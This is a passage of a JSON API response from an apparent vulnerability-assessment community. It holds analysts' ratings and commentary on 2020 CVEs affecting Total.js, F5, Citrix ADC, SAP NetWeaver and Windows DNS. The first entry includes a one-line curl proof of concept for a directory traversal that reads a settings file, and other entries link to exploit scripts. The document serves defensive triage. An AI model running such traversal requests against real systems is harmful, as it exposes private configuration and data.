{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=7&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=5&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=6&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "ce153c63-2870-4013-868f-bd5b15abd28d",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "ae901257-7157-48f5-a978-5fbe7a2c16c0",
      "created": "2020-07-05T14:29:42.713955Z",
      "revisionDate": "2020-07-10T17:26:03.743383Z",
      "document": "__Totaljs - Unathenticated Directory Traversal__\r\n\r\n__DESCRIPTION__\r\nUser can make requests like \u201cGET /../databases/settings.json\r\nHTTP/1.1\u201d and include file contents from outside the /public\r\nthe directory which is the default directory for accessible static files.\r\n\r\n__Refer:-__\r\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8903\r\n\r\n__PROOF OF CONCEPT__\r\n```\r\n$ curl -v --path-as-is\r\nhttp://127.0.0.1:8000/.%2e/databases/settings.json \r\n```\r\n#(note that .json is in the extensions list by def.)",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "238b21a6-9aa0-4ae6-82eb-3a380051af89",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-07-06T02:29:00.291455Z",
      "revisionDate": "2020-07-07T14:23:07.746776Z",
      "document": "Noticed an initial script from @RootUp that looks handy for scanning environments: https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse\r\n\r\nThis script may be better with fewer false-positives according to [here](https://twitter.com/TychoTithonus/status/1280032891901108225) :\r\nhttps://github.com/rwincey/CVE-2020-5902-NSE/blob/master/http-f5-tmui-path-traversal.nse\r\n\r\nNote that these scripts actively exploit the vuln, which may not be legal to run without permission, noted by @tsellers-r7  https://twitter.com/TomSellers/status/1280485081908305920",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "e6f8b50e-eb6e-45f3-b4cd-2dfc7fb4c1ba",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "2918dc2b-4df0-4829-9e8b-77198c86add1",
      "created": "2020-07-07T18:42:06.179259Z",
      "revisionDate": "2020-07-28T23:23:25.310488Z",
      "document": "This is paired with sister vulnerability [CVE-2020-1457](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1457), is a memory corruption issue with Microsofts HEVC (High Efficiency Video Codec) that is a component one can optionally install from the Windows Store on Windows 10 and later. This is not a default component; it even requires the user to actually pay $0.99 in order to install it. So, in order for this to be exploitable::\r\n - a user would have to have also configured the Windows Store to allow payments in the first place.\r\n - a user would have had to have manually installed this codec and paid the fee\r\n - the user would also have to have open a malicious file they downloaded\r\n - while simultaneously not being connected to the internet such that the Windows Store could update (which it does automatically, and when a file is opened)\r\n\r\nIt is possible to enumerate that this codec is installed through a WMI query (see [here](https://www.pdq.com/blog/how-to-inventory-windows-store-apps/) for how to enumerate), but it is highly unlikely that it could be exploited in any viable way. It is not even possible to easily perform research on the memory corruption vulnerability itself at this time, since it does not appear possible to obtain the vulnerable version of the codec from the store anymore.\r\n\r\nAs an experiment, I downloaded several sample HEVC files, and was not even able to get the Windows video player to play them or open the store to install the codec in the first place, since Windows does not support many of the common video encapsulation formats used with HEVC.\r\n\r\nHT to this helpful Slashdot thread for additional information: https://tech.slashdot.org/comments.pl?sid=16708416&cid=60262150",
      "score": 4,
      "metadata": {
        "tags": [
          "obscure_configuration",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "a8c51e57-6cf7-4226-a3db-e7afe74956b9",
      "editorId": "9226c3d5-5477-4510-8c85-a2f58dd8bf1d",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2020-07-10T04:11:23.8896Z",
      "revisionDate": "2020-08-07T01:46:20.68421Z",
      "document": "High Vulnerability ",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "ef689622-0efb-431d-9232-6ae9bccd5920",
      "editorId": "bcced3df-2bfd-4786-9f86-5085d1733b03",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-07-10T13:59:23.284563Z",
      "revisionDate": "2021-03-23T14:48:12.872821Z",
      "document": "If the exploit fits in a tweet, you know it's pretty bad lmao",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "default_configuration",
          "pre_auth",
          "exploited_in_the_wild",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b43da867-8cd8-4ab3-a0c7-bafe65990d5e",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "69741dfd-3169-4113-b9d5-f2d752453cca",
      "created": "2020-07-10T23:15:07.100413Z",
      "revisionDate": "2020-07-10T23:17:58.465096Z",
      "document": "Active exploitation targeting recently published Citrix ADC vulns as of July 9, according to SANS ISC: https://isc.sans.edu/forums/diary/Active+Exploit+Attempts+Targeting+Recent+Citrix+ADC+Vulnerabilities+CTX276688/26330/",
      "score": 2,
      "metadata": {
        "tags": [
          "exploited_in_the_wild",
          "common_enterprise"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        }
      ]
    },
    {
      "id": "50e7e3c5-644c-46ae-b650-1ef45cec22ad",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "69741dfd-3169-4113-b9d5-f2d752453cca",
      "created": "2020-07-10T23:17:32.725062Z",
      "revisionDate": "2020-07-11T00:13:46.095642Z",
      "document": "Taking a quick look at [NCC group research](https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/] on this, it looks like combining the CVE-2020-8193 authentication bypass with one of the other vulnerabilities allows one to steal VPN session data from a device.",
      "score": 2,
      "metadata": {
        "tags": [
          "exploited_in_the_wild",
          "common_enterprise",
          "pre_auth"
        ],
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "e539d468-5e68-4c0c-9b9f-042559b605fc",
      "editorId": "08844197-ce9e-4bd8-a6f1-58a56932d577",
      "topicId": "0f7c99dd-a482-4bc0-980e-6b103decd87d",
      "created": "2020-07-12T01:32:10.268107Z",
      "revisionDate": "2020-07-14T17:02:53.54601Z",
      "document": "This is a denial of service condition against unpatched Wireshark clients for Windows. From Wireshark website \"It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\" In other words, the worst case scenario is you crash Wireshark, and the user simply has to restart the client. \r\n\r\nSolution is to upgrade to Wireshark 3.2.5 or later.",
      "score": 2,
      "metadata": {
        "tags": [
          "requires_interaction",
          "obscure_configuration",
          "no_useful_data",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "00896b98-a5ae-4bfd-93d1-535a2eb45c39",
      "editorId": "51a68212-6d1a-4a6c-b541-b89a206a05b1",
      "topicId": "ef56f4a3-b95c-4ca0-9e19-ba58e1295785",
      "created": "2020-07-12T18:17:13.373851Z",
      "revisionDate": "2020-08-24T03:25:34.099371Z",
      "document": "Full details are here : https://dmaasland.github.io/posts/citrix.html\r\n\r\nPublic reporting on July 8th, 2020 by Donny Maasland discussed how the vulnerability could be exploited.\r\n\r\nAs of July 10th, RIFT has confirmed that this vulnerability can be used to extract valid VPN sessions from a vulnerable instance (cf. https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/amp/).\r\n\r\nI write quicly a metasploit auxilary scanner and tested on netscaler 12.1 build 57.18  (https://github.com/Zeop-CyberSec/citrix_adc_netscaler_lfi)",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "pre_auth",
          "exploited_in_the_wild",
          "difficult_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "16ffe0b1-a39a-4daf-b622-47497308dad4",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "56338dbb-1286-429b-b980-5aedd3a6e87c",
      "created": "2020-07-14T07:10:30.216799Z",
      "revisionDate": "2020-08-24T03:46:21.603044Z",
      "document": "This is an incredibly attractive and simple attack target: It's an easily exploitable vulnerability in a highly-exposed HTTP interface (frequently user- and internet-facing) where successful exploitation allows remote, unauthenticated attackers to create user accounts with the highest possible privileges and generally declare themselves the feudal lords of critical SAP estates. \r\n\r\nIt's difficult to imagine that widespread exploitation would take much time at all. SAP included a mitigation in the patch release details, but with so many mitigation bypasses coming out for other recent critical vulns, it's definitely advisable to [take CISA's guidance to heart](https://us-cert.cisa.gov/ncas/alerts/aa20-195a#:~:text=On%20July%2013%2C%202020%20EST%2C%20SAP%20released%20the%20patch%20for,NetWeaver%20AS%20for%20Java%20component.&text=A%20remote%2C%20unauthenticated%20attacker%20can,cases%2C%20exposed%20to%20the%20internet)\u2014i.e., patch over mitigation wherever possible and as quickly as possible.",
      "score": 5,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "pre_auth",
          "exploited_in_the_wild"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "4e28c846-4df5-41b5-9221-56555dc67340",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "1de0adec-8107-491a-bc8f-dcc3bf6eb3ab",
      "created": "2020-07-14T18:11:54.168515Z",
      "revisionDate": "2020-10-22T14:57:15.660368Z",
      "document": "Important Update: This is now supposedly being exploited in the wild by Chinese state actors according to this NSA announcement: https://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF\r\n\r\nUpdate: Checkpoint has since released their blog post at https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/ with much more details on this vulnerability than when I originally wrote this. I'll update a few statements here but readers are encouraged to read the paper for more details.\r\n\r\nOn July 14th, 2020, Microsoft released CVE-2020-1350, a critical DNS server remote code execution vulnerability that can result in Domain compromise and which is listed as a 10.0 CVE rating. Microsoft also described this vulnerability as wormable and recommended the following mitigation:\r\n\r\n```\r\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \r\n  DWORD = TcpReceivePacketSize \r\n  Value = 0xFF00\r\n```\r\nThis is rather odd to me. 0xFF00 looks like a potential mitigation against a integer overflow, as its possible the vulnerability stems from any packets being over 0xFFFF causing an integer overflow in memory, resulting in the allocation of a very small amount of memory to hold a very large buffer. At the very least, the fact that the recommended mitigation forcibly controls the max size of the packet that can be received suggests that this is a buffer overflow of some sort. Given the dynamic nature of DNS and the fact that it has to handle multiple requests at once, my guess is that its a heap buffer overflow.\r\n\r\nNow that CheckPoint's blog post is public one can confirm that this is in fact a integer overflow leading to a heap buffer overflow within the `SigWireRead` function of `dns.exe`, the server component of Microsoft's DNS implementation. When the DNS server receives a SIG query response, that, when decompressed, incremented by 0x14, and added to the result of an earlier `Name_PacketNameToCountNameEx` call, is greater than 0xFFFF, will result in integer overflow, resulting in the following `RR_AllocateEx` call allocating too small of a heap buffer for the resource record, and a heap buffer overflow occurring when `memcpy` is called to copy the SIG query response into the overly small heap buffer that `RR_AllocateEx` allocated.\r\n\r\nA very important point to note here is that whilst there is a RCE potential here by smuggling DNS requests over HTTP, it seems that CheckPoint has noted that only some browsers, notably Microsoft Edge and Internet Explorer, actually support sending HTTP requests to port 53, so whilst their video at https://youtu.be/PUlMmhD5it8 is certainly pretty cool, its important to note that with Google Chrome taking up over 65% of the browser market share according to https://gs.statcounter.com/browser-market-share as of July 2020, and IE and Edge accounting for a combined total of roughly 4% of all browsers, its pretty unlikely that most organizations will be affected by the HTTP smuggling attack vector unless users are forced to use IE/Edge in their networks for some reason (such as support for legacy apps).\r\n\r\nEdit: @cblack-r7 Also pointed out to me that looking at https://support.microsoft.com/en-us/help/4569509/windows-dns-server-remote-code-execution-vulnerability they mention this line \"After the workaround is implemented, a Windows DNS server will be unable to resolve DNS names for its clients when the DNS response from the upstream server is larger than 65280 bytes.\" He noticed that the terminology \"upstream server\" could mean that the malicious overly large DNS response has to come from an upstream resolver, which could complicate this vulnerability a little bit. This is also something that @busterb's assessment seems to reflect concern about and is something that the CheckPoint blog doesn't really address from what I've seen (though feel free to correct me if I am wrong here)\r\n\r\nIt should be noted that this vulnerability only affects Microsoft's DNS implementation, however it goes way back all the way to Windows Server 2008. I wouldn't be surprised if this also potentially affected Windows Server 2003 as well though, given how these types of vulns tend to be rather systemic, but I could be wrong there.\r\n\r\nAnother important point to note is that on Windows the DNS service runs as SYSTEM, so this will essentially be a remote SYSTEM level exploit for any attackers, which is pretty powerful. Unfortunately there is a limitation that if this is a remote RCE on the heap, the attacker will most likely have to deal with a lot of the new heap related mitigations introduced starting with Windows 8 and which were greatly improved with Windows 10. So this likely means that Windows Server 2008 and Windows Server 2008 R2 will be easy to develop an exploit for, but more recent servers like Windows Server 2019 may see a noticeable lag in exploit development time whilst exploit developers work their way around these mitigations. This can be seen in past heap overflow exploits where the Windows 7/Windows Server 2008 exploit came out very quickly but in some cases it took several months or even a year for the Windows 10/Server 2019 exploit to come out.\r\n\r\nIt should be noted that whilst this vulnerability has not been used in active attacks according to Microsoft, I'd safely place money on seeing this vulnerability get weaponized very quickly.\r\n\r\n",
      "score": 7,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "62814b51-fcdd-4858-862c-eeb2f5890cf3",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "1de0adec-8107-491a-bc8f-dcc3bf6eb3ab",
      "created": "2020-07-14T21:20:32.565648Z",
      "revisionDate": "2020-07-28T23:12:55.727803Z",
      "document": "Given the need to include a corrupted response from a recursive DNS server in the chain, this may be difficult to exploit in practice, at least with a properly configured DNS server that doesn't allow recursive queries from untrusted sources.\r\n\r\nThis vuln seems like it needs a hat trick to execute, when there might be easier ways to get DA in a network, but after looking at some analysis by others on this, it seems there could be some creative solutions. I'm changing my mind in that there may be some form of attack on this soon, even if it's just leveraging the DoS attack, such as this is a crash PoC from maxpl0it:\r\n\r\nhttps://twitter.com/maxpl0it/status/1283537179365564417\r\nhttps://twitter.com/maxpl0it/status/1283471692006920193\r\n\r\nHere are some ruminations on alternate vectors outside of just directly making queries:\r\nhttps://twitter.com/bmenrigh/status/1283189603873075201\r\n\r\nBasically all the info is here for someone to try to attempt a mass DoS attempt at least in conjunction with some sort of side-channel attack on domain-joined clients. So this may become easier to weaponize for crashing domain controllers, but I still posit a reliable RCE will be difficult.",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_develop",
          "high_privilege_access",
          "common_enterprise",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "f20fd8e5-9565-44b6-90d3-607720749c8a",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "56338dbb-1286-429b-b980-5aedd3a6e87c",
      "created": "2020-07-15T18:34:59.673403Z",
      "revisionDate": "2020-07-28T23:12:52.536828Z",
      "document": "__Description__:-\r\nSAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.\r\n\r\n\r\n__POC__\r\nhttps://github.com/chipik/SAP_RECON/blob/master/RECON.py\r\n\r\n",
      "score": 5,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "pre_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "c6228fc7-d0c5-4578-a125-59049ffb6a5d",
      "editorId": "e7379dc5-03db-4a76-850f-03585183b432",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-07-17T13:32:30.016961Z",
      "revisionDate": "2021-06-11T21:33:26.906666Z",
      "document": "a",
      "score": -5,
      "metadata": {
        "tags": [
          "obscure_configuration",
          "easy_to_develop",
          "pre_auth",
          "difficult_to_exploit",
          "difficult_to_patch"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "106f221e-cf56-4e0b-adee-cb03c7d5c533",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "9c1d0e92-46e7-498e-99d8-8198572e25e3",
      "created": "2020-07-17T14:11:09.549811Z",
      "revisionDate": "2020-07-17T17:28:28.760493Z",
      "document": "Versions of Wildfly below `20.0.0.Final` can load arbitrary classes through either JNDI or EJB invocation, which could potentially result in RCE. Despite that, authentication is required, making exploitation all the more difficult.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "65a3530b-ccff-41be-ae7b-474a36ea1ee1",
      "editorId": "05ddf8cd-2745-4da6-8f8e-7d0793e563ba",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2020-07-21T15:50:40.425219Z",
      "revisionDate": "2020-07-28T23:12:39.913739Z",
      "document": "This vulnerability may seem very useful, it is probably as interesting as other RCEs affecting Microsoft Windows OSes, however public exploits rely on the existence of a registry key (fDisableCam) not being present by default (it has to be manually created) thus not found in enterprise networks.",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "pre_auth",
          "obscure_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
